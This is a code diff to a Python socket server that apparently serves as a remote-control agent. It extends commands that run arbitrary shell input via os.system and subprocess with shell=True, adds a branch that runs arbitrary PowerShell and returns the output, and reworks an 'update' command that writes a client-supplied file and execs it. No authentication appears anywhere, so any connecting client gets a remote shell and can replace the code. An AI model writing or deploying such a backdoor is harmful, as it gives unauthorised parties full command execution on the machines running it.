@@ -24,6 +24,18 @@ def get_local_ip():
         print(f"Error determining local IP: {e}")
         return '127.0.0.1'
 
+def receive_file(conn, file_name, file_size):
+    """Receive a file in chunks."""
+    received_size = 0
+    with open(file_name, 'wb') as f:
+        while received_size < file_size:
+            file_data = conn.recv(1024)
+            if not file_data:
+                break
+            f.write(file_data)
+            received_size += len(file_data)
+    print(f"File {file_name} received successfully.")
+
 def start_server(port=65432):
     host = get_local_ip()  # Get dynamic local IP
     
@@ -71,15 +83,13 @@ def start_server(port=65432):
                         elif splitUp[0].lower() == "update":
                             # Receive and replace the server file
                             file_name = splitUp[1]
-                            with open(file_name, 'wb') as f:
-                                file_data = conn.recv(1024)
-                                while file_data:
-                                    f.write(file_data)
-                                    file_data = conn.recv(1024)
-                            # Replace the current server script (for update)
+                            file_size = int(splitUp[2])
+                            print(f"Receiving file: {file_name} with size: {file_size} bytes")
+                            receive_file(conn, file_name, file_size)
                             response = f"Server updated with {file_name}."
                             conn.sendall(response.encode('utf-8'))
-                            os.execv(file_name, ['python', file_name])  # Restart with new server file
+                            print("Restarting server with new file...")
+                            os.execv(file_name, [file_name])  # Restart with new server file
                         
                         elif splitUp[0].lower() == "do":
                             # Execute command
@@ -87,11 +97,23 @@ def start_server(port=65432):
                             os.system(command)
                             response = "done"
                             conn.sendall(response.encode('utf-8'))
+
                         elif splitUp[0].lower() == "get":
                             # Execute command
                             command = splitUp[1]
                             response = subprocess.check_output(command, shell=True)
                             conn.sendall(response)
+
+                        elif splitUp[0].lower() == "powershell":
+                            # Execute PowerShell command
+                            powershell_command = splitUp[1]
+                            print(f"Executing PowerShell command: {powershell_command}")
+                            try:
+                                result = subprocess.check_output(["powershell", "-Command", powershell_command], shell=True)
+                                conn.sendall(result)
+                            except subprocess.CalledProcessError as e:
+                                error_message = f"PowerShell command failed: {e.output.decode('utf-8')}"
+                                conn.sendall(error_message.encode('utf-8'))
                     
                     except Exception as e:
                         print(f"Error handling client {addr}: {e}")
